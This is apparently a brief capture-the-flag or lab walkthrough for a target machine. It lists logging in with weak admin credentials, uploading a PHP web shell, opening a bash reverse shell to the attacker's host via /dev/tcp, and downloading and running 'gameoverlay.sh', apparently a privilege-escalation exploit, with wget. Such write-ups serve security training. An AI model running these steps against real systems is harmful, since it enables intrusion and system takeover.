1. Login to [url](http://10.10.11.241:8080/) and login as admin:123456
2. Upload **powny-shell.phar**
3. Access http://10.10.11.241:8080/uploads/powny-shell.phar
4. nc -lvnp 8888
5. In Powny do: bash -c 'exec bash -i &>/dev/tcp/10.10.14.21/8888 <&1'
6. [[Python3|Stabilize shell]]
7. python
8. Go to tmp
9. wget http://10.10.14.21:8000/gameoverlay.sh
10. chmod +x gameoverlay.sh
11. ./gameoverlay.sh
12. Stabelize shell